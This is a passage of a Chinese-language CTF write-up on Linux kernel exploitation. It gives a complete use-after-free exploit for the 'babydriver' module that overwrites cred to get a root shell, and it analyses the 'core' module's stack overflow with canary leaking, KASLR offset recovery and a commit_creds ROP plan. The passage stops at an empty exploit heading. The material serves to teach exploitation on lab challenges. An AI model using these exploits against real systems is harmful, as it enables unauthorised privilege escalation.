
```c
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
size_t v3; // rdx
size_t v4; // rbx
__int64 result; // rax
__fentry__(filp, command);
v4 = v3;
if ( command == 0x10001 )
{
kfree(babydev_struct.device_buf);
babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
babydev_struct.device_buf_len = v4;
printk("alloc done\n");
result = 0LL;
}
else
{
printk(&unk_2EB);
result = -22LL;
}
return result;
}
```

至此，利用思路已经非常明显了。

由于`babydev_struct`只存在一个，且调用到`babyrelease`的时候有uaf漏洞，我们可以open两个设备，然后使用`babyioctl`将`babydev_struct.device_buf_len`改成`cred`结构体的大小之后free掉，造成第二个设备存在一个悬挂指针。

此时再`fork()`一个新线程，由于kernel的内存分配器采用的是SLUB，之前释放掉的那个和cred结构体相同大小的堆块会直接当成这个线程的cred被申请（`kmem_cache_cpu->freelist`是后进先出的，类似于用户态glibc的fastbin，不过object并没有header。另，本题内核版本在`4.4.72`，cred结构体的分配此时还并没有被隔离到`cred_jar`中）

在这个进程中使用`babywrite`，便可将cred的`gid`和`uid`都设置为0

写好exp过后，由于`rootfs.cpio`里并没有`libc`，所以编译的时候要使用静态编译

```shell
gcc exp.c -o exp -static
```

然后重新打包文件系统，并修改`boot.sh`中`-initrd`参数为新打包好的文件系统。

此时再打开`qemu`，运行exp过后便可提权成功。

（由于本做法在高版本不可能适用，且实际意义不大，所以下文将采用一些更"有意思"的做法来提权）

![](upload/attach/202303/951122_WB3YQV874QGHBNB.png)

#### exp

```c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<sys/wait.h>
#include<sys/stat.h>
int main(){
int fd1 = open("/dev/babydev", O_RDWR);
int fd2 = open("/dev/babydev", O_RDWR);
ioctl(fd1, 0x10001, 0xa8);
close(fd1);
int id = fork();
if(id<0){
printf("fork error!\n");
exit(-1);
}
else if(id==0){
char cred[0x20] = {0};
write(fd2, cred, 0x1c);
if(getuid()==0){
system("/bin/sh");
exit(0);
}
}
else{
wait(NULL);
}
return 0;
}
```

## Kernel ROP

本质上和用户态的rop并无区别，只是目标从getshell变成了提权，并且rop结束部分需要引导程序流着陆回用户态

### core

#### 分析

题目给出了`bzImage`, `core.cpio`, `start.sh`, `vmlinux`四个文件。

先将`core.cpio`解包

发现除了常规文件以外，还多了一个`gen_cpio.sh`

内容如下：

```shell
find . -print0 \
| cpio --null -ov --format=newc \
| gzip -9 > $1
```

这是一个快速打包用的批处理文件。

看看`start.sh`

```shell
qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic \
```

开启了kaslr保护，并且用`-s`为`gdb`开了端口，所以不需要再`-gdb tcp::1234`开了。

不过他设置的64M内存不是很够用，我最终设置到了256M才能启动。

然后分析`init`

```shell
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2
insmod /core.ko
poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys
poweroff -d 0 -f
```

比较特殊的地方就是将`/proc/sys/kernel/kptr_restrict`和`/proc/sys/kernel/dmesg_restrict`的内容设为了`1`，如此一来，就无法通过`dmesg`和查看`/proc/kallsyms`来获取函数地址了。

好在他前面有一行

```shell
cat /proc/kallsyms > /tmp/kallsyms
```

将`kallsyms`备份到了`tmp`文件夹下。

然后之后设置了`poweroff -d 120 -f`，这句比较影响之后的调试，可以直接删掉，或者把时间改长一点。

我最终修改过后的`init`文件如下

```sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2
insmod /core.ko
chown root:root /flag
chmod 400 /flag
cat /sys/module/core/sections/.text > /tmp/info
poweroff -d 1200000 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
# setsid /bin/cttyhack setuidgid 0 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys
poweroff -d 0 -f
```

将`core`的`.text`节地址备份出来是为了方便后续`gdb`加载symbol文件。

而且这个`/sys/module/core/sections/.text`是只有`root`能读的，直接备份出来比较省事，当然也可以直接修改成`root`启动。

此外，为了方便后续打包和调试，我还写了两个批处理文件

```shell
root@ubuntu:/home/kotori/Desktop/core# cat pack.sh
rm ./core.cpio
./gen_cpio.sh ./core.cpio
chmod 777 ./core.cpio
root@ubuntu:/home/kotori/Desktop/core# cat mkc.sh
gcc ./exp.c -o exp --static -masm=intel
chmod 777 ./exp
sudo ./pack.sh
```

接下来就是分析`core.ko`的漏洞了

`checksec`发现开启了canary和nx。

`init_module()`和`exit_core()`分别注册和注销了`/proc/core`，`core_release()`什么都没做，这里对它们不作分析。

`core_ioctl`中定义了三种操作，分别是调用`core_read()`，设置全局变量`off`，调用`core_copy_func()`。

```c
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
switch ( a2 )
{
case 0x6677889B:
core_read(a3);
break;
case 0x6677889C:
printk(&unk_2CD);
off = a3;
break;
case 0x6677889A:
printk(&unk_2B3);
core_copy_func(a3);
break;
}
return 0LL;
}
```

`core_read`可以将距离`rsp`偏移为`off`的值往后拷贝0x40个字节给指定缓冲区。

```c
unsigned __int64 __fastcall core_read(__int64 a1)
{
char *v2; // rdi
__int64 i; // rcx
unsigned __int64 result; // rax
char v5[64]; // [rsp+0h] [rbp-50h] BYREF
unsigned __int64 v6; // [rsp+40h] [rbp-10h]
v6 = __readgsqword(0x28u);
printk(&unk_25B);
printk(&unk_275);
v2 = v5;
for ( i = 16LL; i; --i )
{
*(_DWORD *)v2 = 0;
v2 += 4;
}
strcpy(v5, "Welcome to the QWB CTF challenge.\n");
result = copy_to_user(a1, &v5[off], 64LL);
if ( !result )
return __readgsqword(0x28u) ^ v6;
__asm { swapgs }
return result;
}
```

这里利用`off`是可以读出canary的。

`core_write`是将至多0x800个字节从指定缓冲区复制到`name`中去。

```c
__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
printk(&unk_215);
if ( a3 <= 0x800 && !copy_from_user(&name, a2, a3) )
return (unsigned int)a3;
printk(&unk_230);
return 0xFFFFFFF2LL;
}
```

这个`core_copy_func`则是本题最大的漏洞点。

```c
__int64 __fastcall core_copy_func(__int64 a1)
{
__int64 result; // rax
_QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF
v2[8] = __readgsqword(0x28u);
printk(&unk_215);
if ( a1 > 63 )
{
printk(&unk_2A1);
result = 0xFFFFFFFFLL;
}
else
{
result = 0LL;
qmemcpy(v2, &name, (unsigned __int16)a1);
}
return result;
}
```

当长度参数`a1`小于等于63时，便可将`name`中对应字节数的数据复制到栈上变量`v2`中去，且`a1`和63作比较时是有符号数，最后调用`qmemcpy`时转成了`unsigned __int16`。所以只需要将`a1`最低两个字节的数据随便设置成一个能装下`name`的长度，然后其余字节都是`0xff`就行了。我这里最后构造的`a1`是`0xffffffffffff0100`。

所以整个攻击流程如下：

1. 设置好`off`去读出canary的值

2. 布置好rop之后调用`core_write`将rop写入`name`中

3. 调用`core_copy_func`，将`name`的内容写入栈上变量`v2`中，造成栈溢出，调用`commit_creds(prepare_kernel_cred(0))`提权。

当然，在写rop之前，还有一个小小的问题需要解决。那就是解决kaslr和pie带来的偏移问题。

原始无pie的`vmlinux`基址是`0xffffffff81000000`

`commit_creds`的地址是`0xffffffff81000000+0x9c8e0`

`prepare_kernel_creds`的地址是`0xffffffff8109cce0`

包括后续找到的gadgets的地址，这些全是no-pie情况下的地址，我们还需要知道真正运行起来的时候与之的偏移。

这个其实就可以直接在`/tmp/kallsyms`中，利用他给出的`commit_creds`或`prepare_kernel_cred`此时的地址来计算出来。

```c
size_t leak_vmlinux_base(){
FILE* fd = fopen("/tmp/kallsyms", "r");
if(fd==NULL){
puts("[-] open file failed.");
exit(-1);
}
char buf[0x40] = {0};
while(fgets(buf, 0x30, fd)!=NULL){
if(strstr(buf, "commit_creds")){
char ptr[0x18] = {0};
strncpy(ptr, buf, 0x10);
sscanf(ptr, "%lx", &commit_creds);
printf("[+] commit_creds: 0x%lx\n", commit_creds);
prepare_kernel_cred = commit_creds-0x9c8e0+0x9cce0;
fclose(fd);
return commit_creds-0x9c8e0;
}
else if(strstr(buf, "prepare_kernel_cred")){
char ptr[0x18] = {0};
strncpy(ptr, buf, 0x10);
sscanf(ptr, "%lx", &prepare_kernel_cred);
printf("[+] prepare_kernel_cred: 0x%lx\n", prepare_kernel_cred);
commit_creds = prepare_kernel_cred-0x9cce0+0x9c8e0;
fclose(fd);
return prepare_kernel_cred-0x9cce0;
}
}
fclose(fd);
return 0;
}
```

gadgets的预处理可以用`ropper`解决（`ROPgadget`太慢了）

```shell
ropper --file ./vmlinux --nocolor > g
```

至于rop的构思的话就非常简单了，先摆好`rdi`为0，然后调用`prepare_kernel_cred`，此时返回值会在`rax`中，如果有`mov rdi, rax; ret`的话将绝杀，可惜没有。

不过好在有类似的好几个，我选择了`mov rdi, rax; jmp rcx;`

如果在这之前将`rcx`摆好`commit_creds`就很方便了。

然后切换回用户态，`iretq; ret`是有的，`swapgs`就只有`swapgs; popfq; ret;`，所以后面要跟一个垃圾数据平衡一下栈。

最后按照`rip`, `cs`, `rflags`, `rsp`, `ss`的顺序摆好之前用户态的寄存器就好了。

#### exp
